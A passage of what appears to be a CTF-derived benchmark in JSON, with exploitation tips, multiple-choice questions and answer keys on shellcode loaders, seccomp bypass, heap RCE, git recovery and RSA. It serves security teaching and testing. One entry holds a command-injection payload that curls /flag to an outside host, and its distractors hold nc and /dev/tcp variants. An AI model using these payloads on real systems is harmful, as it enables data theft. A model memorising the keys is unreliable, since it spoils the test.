        "type": "pwn",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 445,
        "max_score": 500,
        "difficulty": 0.89,
        "knowledge": [
            "When developing a shellcode for environments with limited input size, consider crafting a compact loader that extends the capability to execute longer shellcodes. This technique involves initially using a short stub shellcode to read further bytes from the standard input (or another input source) into executable memory. Subsequently, control is transferred to this newly read extended shellcode for execution. The example payload fragment demonstrates this strategy with a compact assembly sequence to perform a read syscall into a buffer designated for the extended shellcode:\n```\n0000:   59        pop    rcx     // Prepare for shellcode execution\n0001:   59        pop    rcx     // Adjustments post read syscall\n0002:   31 ff     xor    edi,edi // Set file descriptor to 0 (STDIN)\n0004:   48 96     xchg   rsi,rax // Exchange the values of RSI and RAX; buffer address\n0006:   31 c0     xor    eax,eax // Set syscall number to 0 (sys_read)\n0008:   0f 05     syscall        // Invoke the kernel to perform the read\n000A:   90        nop            // No-operation, placeholder\n```",
            "In scenarios where direct syscalls like `write` are blocked by seccomp filters, indirect methods can be employed for data exfiltration. One approach is utilizing program crashes or specific signals to communicate binary information. Conceptually, this method relies on causing distinct, observable behaviors (e.g., segmentation fault versus trap signal) to relay binary data bit by bit. This oracle-like mechanism can effectively bypass restrictive syscall filters, enabling information leakage from a constrained execution environment. The practical application of this technique involves crafting shellcode that conditionally triggers one of the designated behaviors based on the content of the data being exfiltrated. Such an approach is crucial for circumventing seccomp restrictions without directly invoking blocked syscalls.\n```\n// Exfiltration logic, using conditional execution to signal data bits:\n\ttrue:\n\t    int3                // Trigger a SIGTRAP for a 'true' bit\n\tfalse:\n\t    push 0\n\t    ret                 // Normal exit or different signal for a 'false' bit\n```"
        ],
        "question": [
            "In a CTF challenge scenario where a small buffer needs to be utilized to execute longer shellcode, which of the following best demonstrates the initial part of a compact loader shellcode to read additional bytes into executable memory, assuming the buffer begins execution with the `rax` register pointing to the shellcode's memory location? - A. `0x00: 50 push rax // 0x01: 31 c0 xor eax, eax // Syscall number for sys_write` - B. `0x00: 59 pop rcx // 0x01: 59 pop rcx // 0x02: 31 ff xor edi, edi // 0x04: 48 96 xchg rsi, rax // 0x06: 31 c0 xor eax, eax // 0x08: 0f 05 syscall` - C. `0x00: 58 pop rax // 0x01: 5A pop rdx // Use of pop to manipulate non-target registers` - D. `0x00: B8 01 00 00 00 mov eax, 1 // Direct move into eax for sys_exit`",
            "In an environment where writing data to stdout is restricted by seccomp rules, and direct syscalls are blocked, which of the following shellcode strategies allows for binary data exfiltration by leveraging observable behaviors from the program's exit status? - A. `mov eax, 1 // mov ebx, 0 // int 0x80 // Exit syscall to signal data` - B. `push 0x3c // pop rax // syscall // Using exit syscall directly for signaling` - C. `true: int3 // false: push 0 // ret // Using SIGTRAP versus normal exit to differentiate data bits` - D. `xor eax, eax // inc eax // syscall // Trying to signal via changing return codes`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "obfuscJStore",
        "write_up": "dataset/raw/obfuscJStore.md",
        "type": "This is a `misc` (miscellaneous) challenge.",
        "competition": [
            "BYUCTF/2023",
            "https://ctftime.org/event/1935/tasks/"
        ],
        "score": 100,
        "max_score": 483,
        "difficulty": 0.2070393374741201,
        "knowledge": [
            "When faced with obfuscated JavaScript in CTF challenges, using online tools such as deobfuscate.io for deobfuscating the code can be an effective first step. After deobfuscation, carefully review the code to understand its logic and identify relevant functions or variables that may lead to the flag.",
            "If the deobfuscated code involves checks against `document.domain` or similar conditions that are not met in the execution environment, consider modifying the code to bypass these checks. Specifically, you can comment out or alter conditional statements to ensure that flag-revealing code paths are executed. Alternatively, use environments like `nodejs` to run the modified JavaScript code, as it allows for manual control over conditions and outputs."
        ],
        "question": [
            "When dealing with obfuscated JavaScript code in a CTF challenge, which of the following is a recommended initial approach to make the code readable and begin the analysis? - A. Running the code directly in the browser to see if any errors are logged to the console. - B. Using an online deobfuscation tool such as deobfuscate.io to revert the code to a more understandable format. - C. Immediately searching for potential vulnerabilities like XSS without attempting to understand the code. - D. Manually renaming variables and functions based on assumptions without any deobfuscation.",
            "After deobfuscating JavaScript code and finding that it contains checks against `document.domain` that prevent direct execution of critical paths, which technique is most effective to ensure the execution of flag-revealing functionality? - A. Executing the JavaScript code as is in various browsers and hoping one of them ignores `document.domain`. - B. Rewriting the entire script from scratch based on the deobfuscated logic to avoid the domain check. - C. Modifying the code to bypass or ignore `document.domain` checks and then running it with `nodejs`. - D. Uploading the script to a web server and trying to fulfill the `document.domain` condition through DNS spoofing."
        ],
        "answer": [
            "B. Using an online deobfuscation tool such as deobfuscate.io to revert the code to a more understandable format.",
            "C. Modifying the code to bypass or ignore `document.domain` checks and then running it with `nodejs`."
        ]
    },
    {
        "name": "Obliterated File Again",
        "write_up": "dataset/raw/Obliterated File Again.md",
        "type": "web",
        "competition": [
            "TSG/2019",
            "https://ctftime.org/event/758/tasks/"
        ],
        "score": 178,
        "max_score": 500,
        "difficulty": 0.356,
        "knowledge": [
            "When attempting to recover files deleted with `git filter-branch`, even after aggressive garbage collection (gc) and reflog expiry, it is possible to retrieve the original content if the `refs/original/` directory has not been explicitly cleaned up. This is because `git filter-branch` saves a backup of the refs in `refs/original/`. Running `git reset --hard refs/original/refs/heads/master` can restore the state before `git filter-branch` was applied.",
            "In scenarios where data compression is used within a CTF challenge, if the file format or compression algorithm is known or hinted at (e.g., zlib mentioned in the context or code snippets), attempting decompression using the corresponding method can reveal hidden or obscured flags. This requires familiarity with common compression/decompression libraries in languages such as Python.  \n   **Example Payload**: \n   ```python\n   import zlib\n   with open('path_to_compressed_file', 'rb') as f:\n       decompressed_data = zlib.decompress(f.read())\n   print(decompressed_data)\n   ```"
        ],
        "question": [
            "In a scenario where a repository's files were deleted using `git filter-branch` followed by aggressive garbage collection and expiration of reflogs, which command would effectively restore the repository to its state prior to the deletion, assuming the `refs/original/` directory is still intact? - A. git restore --source refs/original/refs/heads/master - B. git reset --soft refs/original/refs/heads/master - C. git reset --hard refs/original/refs/heads/master - D. git checkout refs/original/refs/heads/master",
            "In a Capture the Flag (CTF) challenge, you are given a file that is suspected to be compressed with zlib. Which Python snippet correctly decompresses the file to reveal potential hidden information? - A. ```python import zlib with open('path_to_compressed_file', 'r') as f: print(zlib.decompress(f.read())) ``` - B. ```python import zlib with open('path_to_compressed_file', 'rb') as file: print(zlib.decompress(file.read()).decode('utf-8')) ``` - C. ```python import zlib f = open('path_to_compressed_file') print(zlib.decompress(f.read())) ``` - D. ```python import gzip with open('path_to_compressed_file', 'rb') as f: print(gzip.decompress(f.read())) ```"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Obliterated File",
        "write_up": "dataset/raw/Obliterated File.md",
        "type": "web",
        "competition": [
            "TSG/2019",
            "https://ctftime.org/event/758/tasks/"
        ],
        "score": 92,
        "max_score": 500,
        "difficulty": 0.184,
        "knowledge": [
            "When encountering a CTF challenge related to git repositories where it's suspected that sensitive files have been purged using methods like `git filter-branch`, `git reflog`, and `git gc`, attempt to restore deleted content by examining the repository's commit history with `git log`. Then, use the `git show <commit_hash>` command to view specific commits that might contain the deleted information. Finally, if a commit deleting the sensitive content is found, the `git revert <commit_hash>` command can be used to undo the changes made by that commit, potentially restoring the deleted file. This approach leverages the fact that, in many cases, git retains history allowing for the recovery of purged data unless very thorough cleansing methods have been employed.",
            "When a recovered file from a git repository shows as being in a compressed or encoded format (e.g., 'zlib compressed data'), use appropriate tools or scripts to decompress or decode the content. For zlib compressed files, a Python script utilizing the `zlib.decompress()` function can be used. This approach assumes familiarity with basic scripting and the ability to identify the format of the compressed or encoded data to apply the correct method for decompression or decoding.\n   \n   Example Python script for decompressing zlib data:\n   ```python\n   import zlib\n   with open('path/to/compressed_file', 'rb') as f:\n       compressed_data = f.read()\n   decompressed_data = zlib.decompress(compressed_data)\n   print(decompressed_data)\n   ```\n   This script opens the compressed file in binary mode, reads its content, decompresses it using `zlib.decompress()`, and prints the decompressed data."
        ],
        "question": [
            "In a CTF challenge involving a git repository from which sensitive information was removed using `git filter-branch`, `git reflog expire`, and `git gc`, you find the repository's commit history using `git log`. You identify a specific commit that might have involved the deletion of a sensitive file. To restore this deleted file, which git command should you use? - A. git revert `<commit_hash>` - B. git checkout `<commit_hash>` - C. git branch `<commit_hash>` - D. git merge `<commit_hash>` ",
            "After recovering a deleted file from a git repository, you discover it's a zlib compressed file. You decide to write a Python script to decompress and read the file's content. Which of the following code snippets correctly performs the decompression of the zlib compressed data? - A. ```python import zlib with open('path/to/compressed_file', 'rb') as f: compressed_data = f.read() decompressed_data = zlib.decompress(compressed_data) print(decompressed_data) ``` - B. ```python import gzip with gzip.open('path/to/compressed_file', 'rt') as f: print(f.read()) ``` - C. ```python import zipfile with zipfile.ZipFile('path/to/compressed_file') as zf: zf.extractall('output_directory') ``` - D. ```python import tarfile with tarfile.open('path/to/compressed_file') as tf: tf.extractall('output_directory') ``` "
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "Occasionally Tested Protocol",
        "write_up": "dataset/raw/Occasionally Tested Protocol.md",
        "type": "crypto",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 219,
        "max_score": 500,
        "difficulty": 0.438,
        "knowledge": [
            "When dealing with challenges that use Python's `random` module seeded with the current time (`time.time()`), a viable approach is to guess the seed by measuring the local system time before and after getting output from the program. This strategy is effective because `time.time()` returns the number of seconds since the epoch, usually resulting in a manageable range of seeds to brute-force. After finding the correct seed by matching the generated output (such as a list of random numbers), one can reproduce the sequence of \"random\" values used by the program, enabling the prediction or replication of values like keys or tokens encrypted or obscured with these \"random\" values.",
            "In cryptographic challenges where an XOR operation is used for encryption or obfuscation and the random part of the key can be predicted or known, reversing the operation to recover the original data becomes possible. This is done by XORing the encrypted data with the same key or sequence of random values (if the seed could be guessed as in the above context). This method relies on the property that \\(A \\oplus B = C\\) implies \\(C \\oplus B = A\\), making it a straightforward operation to recover original plaintext or flags once the correct key sequence is identified.\n\nExample of applying brute-force to find the seed and using it to decrypt data XORed with a predictable sequence:\n\n```python\nfrom random import seed, randint\n\n# Assuming these values were obtained from observing the challenge's output\nobserved_nums = [6370, 578, 948, 4674, 4804, 6605, 2529, 4644, 3823, 4330]\nencrypted_num = 14967871060053757142096566772157693944463496219343006011424058102584\n\n# Example brute-force approach to find the seed\nfor potential_seed in range(start_time, end_time + 1):\n    seed(potential_seed)\n    if all(randint(5, 10000) == num for num in observed_nums):\n        print(f\"Found seed: {potential_seed}\")\n        break\n\n# Decrypting the data\nseed(potential_seed)  # Re-seed with the found seed\ng = encrypted_num.to_bytes(40, 'little')\nb = bytearray([randint(0, 255) for _ in range(40)])\nflag = bytearray(l ^ p for l, p in zip(g, b))\nprint(f\"Flag: {flag.decode('utf-8')}\")\n```"
        ],
        "question": [
            "In a cryptography challenge, if the encryption key is generated using Python's `random` module seeded with the current system time via `time.time()`, which strategy could effectively predict or replicate the encryption key? - A. Use the MD5 hash of the current time as the seed for the `random` module to predict the next sequence of random numbers. - B. Measure the local system time before and after receiving output from the encryption system, then brute-force the seed within this time range to generate the same sequence of \"random\" numbers. - C. Directly analyze the encrypted ciphertext to extract the seed without the need for considering the system time. - D. Increment the seed value from 0 upwards indefinitely until the correct sequence of \"random\" numbers is generated.",
            "In cryptographic systems where XOR encryption is employed with a key sequence generated from a predictable random seed (e.g., the system time), how can the original data (such as a flag) be recovered? - A. By applying a Caesar cipher to the encrypted data using the guessed seed as the shift value. - B. Using a complex machine learning model to predict the original data without needing to know the seed. - C. XORing the encrypted data with the random sequence generated using the correctly guessed seed, exploiting the reversible property of the XOR operation. - D. Applying RSA decryption with a randomly generated pair of public and private keys until the original data is recovered."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Odin Part 2",
        "write_up": "dataset/raw/Odin Part 2.md",
        "type": "crypto",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": 363,
        "max_score": 500,
        "difficulty": 0.726,
        "knowledge": [
            "When analyzing firmware for hidden functionalities or backdoors, searching for protocol constants (like command numbers) can lead to discovering undocumented commands that could be exploited. Once such a command is identified, its working, including required parameters or conditions (like a part of the device's MAC address) for its execution, can be understood from the firmware's code logic. This knowledge is crucial for crafting packets that exploit these backdoors.",
            "To analyze encrypted logging data (like EEPROM dumps) for timestamps or specific command executions, first decrypt the data using the known encryption scheme and key. Once decrypted, the data can be parsed according to the logging format to extract timestamps and payloads. This method is particularly useful for determining the time a specific command was first or last executed, which can aid in forensic analysis or understanding the exploit timeline. Decryption and parsing techniques depend on the encryption scheme used (e.g., AES in ECB mode) and the structure of logged data (e.g., packed timestamps and payloads).\n\n   Example Python script snippet to parse and decrypt EEPROM data:\n\n   ```python\n   from Crypto.Cipher import AES\n\n   key = bytes.fromhex(\"88AD3D8347B8CE82082064B4618D7637\")\n   cipher = AES.new(key, AES.MODE_ECB)\n\n   with open(\"eeprom.bin\", \"rb\") as f:\n       data = f.read()\n\n   for i in range(0, len(data), 16):\n       block = data[i:i+16]\n       decrypted_block = cipher.decrypt(block)\n\n       # Assuming the first 7 bytes are timestamp and next 9 are payload\n       timestamp_bytes = decrypted_block[:7]\n       payload_bytes = decrypted_block[7:]\n\n       # Further processing to interpret timestamp and payload\n   ```\n\nThis snippet demonstrates decrypting EEPROM data in 16-byte blocks, assuming it's encrypted with AES in ECB mode. The actual parsing of `timestamp_bytes` and `payload_bytes` would depend on their specific formats."
        ],
        "question": [
            "When investigating a smart lock firmware for potential backdoors, an undocumented command with the byte value 0x20 was discovered. This command appears to unlock the door without requiring authorization, provided the payload matches certain criteria. What specific condition must be met in the payload for this backdoor command to successfully unlock the door? - A. The payload must include the lock's unique identifier - B. The first four bytes of the payload must match the smart lock's MAC address, followed by a four-byte constant - C. The payload must be encrypted with the smart lock's public key - D. The payload must include a valid timestamp signed by the smart lock manufacturer ",
            "When analyzing an EEPROM dump to identify the exploitation timeline of a hidden backdoor in a smart lock, you need to decrypt the data to retrieve visible logs. Assuming the data is encrypted with AES in ECB mode, and the decryption key is known, which piece of information is crucial for understanding when the backdoor was first used based on the decrypted logs? - A. The version of the AES library used for encryption and decryption - B. The length of the data blocks that the EEPROM stores in plain text before encryption - C. The MAC address of the smart lock, to match encrypted packets in the log - D. The exact timestamp format used in logging, necessary to parse and understand the date and time of backdoor usage "
        ],
        "answer": [
            "B. The first four bytes of the payload must match the smart lock's MAC address, followed by a four-byte constant",
            "D. The exact timestamp format used in logging, necessary to parse and understand the date and time of backdoor usage"
        ]
    },
    {
        "name": "Oh Sheet",
        "write_up": "dataset/raw/Oh Sheet.md",
        "type": "crypto",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": 200,
        "max_score": 300,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "For challenges involving steganography in documents or encoded messages in online documents (such as Google Sheets), clearing the formatting (such as text color, font size) may reveal hidden information. This approach can be critical in initially understanding how data might have been obfuscated.",
            "In challenges where encryption methods are applied using tools with functions like Google Sheets (using `MID`, `FIND`, etc.), and with hints provided on key characteristics (e.g., key length, absence of repeated letters, and case sensitivity), a brute-force approach to decrypt the message can be effective. Utilizing efficient scripting languages such as Python with acceleration through tools like PyPy can significantly improve the brute-forcing process. Given a string length and certain hints about the character set or language, one can generate all possible keys and test each against the encryption to find the plaintext. Example script excerpt for generating keyspace considering given conditions:\n```python\nimport itertools\n\n# Assuming the hint specifies a key of 9 lowercase letters with no repetition.\ncharacter_set = 'abcdefghijklmnopqrstuvwxyz'\nkey_length = 9\n\n# Generate all possible combinations of 9 letters with no repetition.\nkeyspace = itertools.permutations(character_set, key_length)\n\n# This part of the script needs to be adapted to the decryption mechanism.\nfor key in keyspace:\n    # pseudo-code to demonstrate approach\n    decrypted_message = decrypt_message_with_key(encrypted_message, ''.join(key))\n    if decrypted_message == known_plaintext:\n        print(f\"Found key: {''.join(key)}\")\n        break\n```\nNote: This pseudo-code is for illustrative purposes to highlight the approach. In a real situation, the decryption and verification mechanism would be specific to how the encryption is implemented."
        ],
        "question": [
            "In a challenge involving steganography within a Google Sheets document, hidden messages were obfuscated by changing the text color to match the background, making it invisible. What initial step should be taken to reveal potentially hidden messages in such environments? - A. Change the document's sharing settings to edit mode - B. Clear the formatting (e.g., text color, font size) - C. Download the document as a PDF - D. Perform a keyword search using Google Sheets' find feature",
            "When faced with a challenge requiring the decryption of a message encrypted through functions in applications like Google Sheets, and knowing the key is 9 characters long, composed of lowercase letters without repetition, which method is most suitable to undertake the decryption using Python, considering efficiency? - A. Use a linear search algorithm to check each key sequentially - B. Leveraging multi-threading to parallelly try keys generated at random - C. Generate all possible combinations (permutations) of the keyspace and try each systematically - D. Apply a dictionary attack with a pre-defined list of common passwords"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Old Government Site",
        "write_up": "dataset/raw/Old Government Site.md",
        "type": "web",
        "competition": [
            "VolgaCTF/2018/Quals",
            "https://ctftime.org/event/539/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "When encountering a web application that accepts URLs or file paths as input, testing with common Linux directories (e.g., `/etc`, `/var`) or commands (e.g., `/bin/ls`) can help identify if the input is being executed or fetched by the server. This can indicate a potential for command injection vulnerabilities if the input leads to unexpected or unfiltered execution. Condition: Useful when the application interacts with server files or external URLs based on user input.",
            "For exploiting command injection vulnerabilities in applications built with Ruby, especially those utilizing the open-uri library, crafting payloads that execute additional commands can be effective. This is possible if the application does not properly sanitize the input, allowing for the execution of arbitrary commands. Payloads can be designed to read sensitive files (e.g., `/flag`) and exfiltrate the data to a controlled external server. Example payload: `|curl -d \"$(cat /flag)\" -X POST http://ptsv2.com/t/3awt7-1521988385/post`. Condition: Applicable when the web application is vulnerable to command injection due to improper input handling, particularly in environments using Ruby and open-uri."
        ],
        "question": [
            "In a web application scenario, when testing for command injection vulnerabilities, which of the following inputs is LEAST likely to indicate a potential vulnerability if the server fetches or executes based on user input? - A. `/etc` - B. `http://example.com` - C. `/bin/ls` - D. `/var`",
            "When exploiting a command injection vulnerability in a Ruby application using open-uri, which of the following payloads is correctly formatted to read and exfiltrate the contents of the `/flag` file to an external server? - A. `|wget -O - $(cat /flag) http://externalserver.com/post` - B. `|nc -l > /flag` - C. `|curl -d \"$(cat /flag)\" -X POST http://ptsv2.com/t/3awt7-1521988385/post` - D. `> /dev/tcp/externalserver.com/80 < /flag`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "oldmodem",
        "write_up": "dataset/raw/oldmodem.md",
        "type": "misc",
        "competition": [
            "GACTF/2020",
            "https://ctftime.org/event/1115/tasks/"
        ],
        "score": 555,
        "max_score": 625,
        "difficulty": 0.888,
        "knowledge": [
            "For challenges involving files with no clear indication of format or purpose, using `binwalk` can reveal embedded file types or data, potentially uncovering hidden content such as archives. After identifying a zip archive using `binwalk`, one can use `unzip` to extract its contents, which might be crucial for solving the challenge.",
            "When dealing with audio files that are suspected to contain data modulated via frequency shifts, such as tones from an old modem, the `minimodem` tool is invaluable. It can demodulate audio files back into digital information if the correct baud rate (transmission speed) is known or can be guessed. For Bell 202 modulated signals, the baud rate to be used with `minimodem` is 1200, reflecting its transmission speed of 1200 bits per second.\n   Example command: `minimodem -r -f <audio_file> 1200`"
        ],
        "question": [
            "When encountering a file of unknown type in a cybersecurity challenge, what is the first approach to identify potential hidden content within the file? - A. Open the file in a text editor to check for visible headers or footers. - B. Use a forensic imaging tool to create a disk image of the file for analysis. - C. Utilize the `binwalk` command to scan the file for embedded data types or archives. - D. Attempt to open the file with various applications based on a guess of its format.",
            "To demodulate data encoded as audio modem tones in a cybersecurity challenge, you suspect that the data is modulated using Bell 202 standards. Which command should you use with the `minimodem` tool to decode this data? - A. `minimodem --rx -f <audio_file> -b 2200` - B. `minimodem -r -f <audio_file> 1200` - C. `minimodem --tx <audio_file> --baudrate 300` - D. `minimodem -decode -file <audio_file> -rate 9600`"
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "OldNote",
        "write_up": "dataset/raw/OldNote.md",
        "type": "pwn",
        "competition": [
            "PoseidonCTF/2020",
            "https://ctftime.org/event/1049/tasks/"
        ],
        "score": 995,
        "max_score": 1000,
        "difficulty": 0.995,
        "knowledge": [
            "When exploiting heap-based vulnerabilities, especially in scenarios where the program has a limitation on chunk size and only basic operations such as create and delete, leveraging signed integer vulnerabilities to bypass size restrictions can be effective. If the application uses `atoi()` or a similar function to read sizes for memory allocations, providing a negative size can be used to exploit certain vulnerabilities, like the one in CVE-2017-17426. This allows for unexpected behavior such as obtaining a chunk when a NULL should be returned, facilitating heap overflow or arbitrary memory write scenarios.\n\n   - **Condition**: Application uses functions like `atoi()` for size input that do not validate negative input.\n   - **Knowledge**: Exploit negative size allocations to bypass restrictions and potentially exploit vulnerabilities for arbitrary writes or overflows.\n   - **Example Payload**: Providing a size of `-1` to an application that converts it to unsigned internally, resulting in large allocations or behavior that can be exploited.",
            "For achieving Remote Code Execution (RCE) through heap exploitation, a combination of heap overflow to corrupt tcache or unsorted bin metadata, and the modification of `__free_hook` to a function like `system()` can be used. This approach typically involves overflowing a chunk to modify metadata of adjacent chunks or the tcache itself, then freeing and reallocating chunks to control the `__free_hook` symbol's content. This method is effective in environments where the heap layout can be manipulated to create conditions for overlapping chunks or where metadata can be directly corrupted.\n\n   - **Condition**: Application allows heap overflow, and there is control over the content written to freed chunks.\n   - **Knowledge**: Use heap overflow to corrupt metadata or tcache entries, leading to `__free_hook` modification with `system()` for RCE.\n   - **Example Payload**: Overwrite a chunk\u2019s metadata to point `__free_hook` to `system()`, then allocate a chunk containing the command `/bin/sh`, and finally trigger `free()` on that chunk to execute the command."
        ],
        "question": [
            "In a scenario exploiting a signed integer vulnerability for heap-based attacks, if an application uses `atoi()` to convert user input into sizes for memory allocations and does not validate negative inputs, what is the potential vulnerability that can be exploited? - A. Bypassing stack canaries to execute a stack overflow - B. Leveraging negative sizes to create large allocations or unexpected behavior - C. Using format string vulnerabilities to leak memory addresses - D. Exploiting integer overflows to bypass authentication",
            "When attempting to achieve Remote Code Execution (RCE) through heap exploitation, which approach is valid for exploiting heap overflows to manipulate metadata or tcache entries, ultimately leading to control over the `__free_hook`? - A. Creating an integer overflow to modify the global offset table - B. Executing a stack buffer overflow to corrupt the return address - C. Manipulating heap metadata to point `__free_hook` to `system()` for execution of arbitrary commands - D. Using a double free vulnerability to leak stack addresses"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "one and a half man",
        "write_up": "dataset/raw/one and a half man.md",
        "type": "pwn",
        "competition": [
            "3kCTF/2020",
            "https://ctftime.org/event/1077/tasks/"
        ],
        "score": 493,
        "max_score": 500,
        "difficulty": 0.986,
        "knowledge": [
            "When facing a buffer overflow challenge with restrictions such as non-executable stack (NX enabled) and lack of control over certain registers or syscall gadgets, one technique is to override Global Offset Table (GOT) entries to redirect library functions to desired gadgets within the same library. This method allows for circumventing protections and indirectly executing system calls. Conditionally, this approach relies on knowing the memory layout (e.g., addresses of PLT/GOT, function prologues) and being able to write to arbitrary addresses (e.g., through a buffer overflow). Example: Overriding the `read` GOT entry to point to a \"syscall; ret\" gadget to execute a `write` system call indirectly through `read@PLT`.",
            "In scenarios where direct invocation of system calls like `execve` is not trivial due to absence of syscall gadgets and register control limitations, one can leak a library pointer (e.g., libc pointer) to calculate the libc base address. Then, leveraging ROP gadgets found within the libc itself to set up registers for the `execve` system call. This approach often requires chaining gadgets to set up the required `execve` arguments (`\"/bin/sh\"`, 0, 0) in the correct registers (typically `rdi`, `rsi`, and `rdx` for x64 calling conventions), followed by the `syscall` instruction gadget. Preconditions include the ability to leak memory addresses (e.g., format string vulnerability or controlled read/write primitive) and calculating offsets for desired gadgets based on the leaked libc base address."
        ],
        "question": [
            "When dealing with a buffer overflow vulnerability in an environment where the stack is non-executable (NX enabled), and you need to leverage existing library code for arbitrary execution, which of the following best describes the method to hijack control flow via GOT manipulation? - A. Modifying the .text section to point to custom shellcode. - B. Editing the Global Offset Table entry for `read()` to redirect it to a syscall instruction within the libc. - C. Overwrite the stack canary to bypass NX protections. - D. Changing the return address on the stack to point directly to a libc `execve` function.",
            "When a direct system call gadget is not available, and you aim to perform a `execve(\"/bin/sh\", 0, 0)` system call by calculating the libc base address from a leaked pointer, which approach is required for setting up the registers correctly using Return-Oriented Programming (ROP) in x64 assembly? - A. Modify the .data section to inject and execute shellcode. - B. Use ROP gadgets to fill the `rdi`, `rsi`, and `rdx` registers with the appropriate values before calling a `syscall` gadget. - C. Take advantage of a `jmp esp` instruction to bypass the need for register setup. - D. Directly overwrite the .got.plt entry of `execve` to point to the beginning of your payload."
        ],
        "answer": [
            "B.",
            "B."
        ]
    },
    {
        "name": "One Part !",
        "write_up": "dataset/raw/One Part !.md",
        "type": "crypto",
        "competition": [
            "FwordCTF/2020",
            "https://ctftime.org/event/1066/tasks/"
        ],
        "score": 261,
        "max_score": 500,
        "difficulty": 0.522,
        "knowledge": [
            "When given portions of the private key or its related values, such as dp (d mod (p-1)) in RSA, it's possible to derive the prime factors of n by brute-forcing potential values of k where k is an integer used to solve for p using the relationship e * dp = 1 + k * (p - 1). This approach allows for the deduction of p and subsequently q since n = p * q. The key insight relies on understanding that d, the private key component, and dp have a computationally exploitable relationship with the modulus n and its prime factors. This avenue of attack is especially viable when the values of e (public exponent) and dp are known alongside the modulus n. Brute-forcing k can be efficiently bounded by realizing that k is less than e, significantly narrowing the search space.\n\n   ```python\n   e = 65537  # Public exponent\n   dp = 15863941351022675271470498055440018518890999065008090553947887331349060559165417151482111730533900341104699951315612031296744594701865438849657867331942686064408344200992596897731186704102476529429339278690748746609131178367030814132224462991833270965841136411444101247903371020388961422615207080090040311385\n   n = 13795029341892417374839569348195219432273811499483782737330171543244685968744999323208547919665299783906957825270449006773866123362810477840346497089695409735324208705537006191240439897433032270300293091365930830592120936636584926755229275335158742925495154248094930986582540466282129158682944188080860981812852232204308214285109566958749409476615914322197257558630214751391486659657892675174292657801181344004269336582824495524735592639617122904261904725149320803824393890508587709714045126033113995823573370380507690572913971259051956543607099582177007672826620386223089090352147939487203095545319421169070202568081\n   for k in range(1, e):\n     p = (e * dp - 1 + k) // k\n     if n % p == 0:\n       print(\"P is:\", p)\n       break\n   ```",
            "After obtaining the prime factors (p and q) of n in an RSA encryption scheme, the next step towards decrypting a cipher involves computing phi(n), which is (p-1) * (q-1), and then calculating the modular inverse of e mod phi(n). This inverse is the private key exponent d, which can be used to decrypt the cipher text. Tools like \"dcode.fr\" provide a convenient method for calculating the modular inverse without having to implement the Extended Euclidean Algorithm manually. Having d, one can decrypt the cipher using m = cipher ^ d mod n, revealing the plaintext message. This decryption process underscores the importance of securing the prime factors and the private exponent in RSA encryption. The security of RSA is fundamentally based on the difficulty of factoring large integers.\n\n   ```python\n   from Crypto.Util.number import inverse, long_to_bytes\n   e = 65537  # Public exponent\n   n = 13795029341892417374839569348195219432273811499483782737330171543244685968744999323208547919665299783906957825270449006773866123362810477840346497089695409735324208705537006191240439897433032270300293091365930830592120936636584926755229275335158742925495154248094930986582540466282129158682944188080860981812852232204308214285109566958749409476615914322197257558630214751391486659657892675174292657801181344004269336582824495524735592639617122904261904725149320803824393890508587709714045126033113995823573370380507690572913971259051956543607099582177007672826620386223089090352147939487203095545319421169070202568081\n   cipher = 4577483075923691025614837387199959169275891010490317043142964745465946594734541383793196135840379923558282553847958293921035008363297701769706082343316794998794846094470932254663483885231325059503550992175528744843034602900645069686396280989390227810555558579302943585247037825841710062260608576583049065083988456565702297252837653658501925749752005065311426953256044460166446107914200467201439311812471408454665833883066991637851573154466515181854296188872448618848136386704796559645721088729635821840733708277778529467678390494522595775876496533057623112322654282130317608735511663306372475467872142100508022014379\n   p = 144039224760594772688606543510580838691127653882437687812979037411280601533114982523785419296758136139509382198582885244540696938622354567177892442689599309587576843156061488346717758801158770339319840441612025575855171797816583328592905878511468146202317893737435863602638296836136237843437631810454554154509\n   q = 95772726941712640001723837214303342002655355883327084521146440778536040744156583801926753814805595606410443413875301543467626805737472254844755121382615457766647100894815371282833364196117624639846104685189532693331432093753023513388892151349214843110728202212644881166427749140369961129200252767068764047509\n   phi = (p-1) * (q-1)\n   d = inverse(e, phi)\n   plaintext = pow(cipher, d, n)\n   print(long_to_bytes(plaintext).decode())  # Decrypted message\n   ```"
        ],
        "question": [
            "Given an RSA encryption scheme where you have the public exponent \\(e = 65537\\), a part of the private key \\(dp\\) and the modulus \\(n\\), which of the following Python snippets correctly implements a method to find a prime factor \\(p\\) of \\(n\\) using brute force, assuming you can calculate \\(dp = d \\mod (p-1)\\)?  - A. ```python for k in range(1, e): p = (e * dp + k) // (k - e) if n % p == 0: print(\"P is:\", p) break ```  - B. ```python for k in range(1, e): p = (e * dp - 1 + k) // k if n % p == 0: print(\"P is:\", p) break ```  - C. ```python for k in range(1, e): p = e // (dp + k) if n % p == 0: print(\"P is:\", p) break ```  - D. ```python for k in range(1, e): p = (e - dp + k) // k if n % p == 0: print(\"P is:\", p) break ``` ",
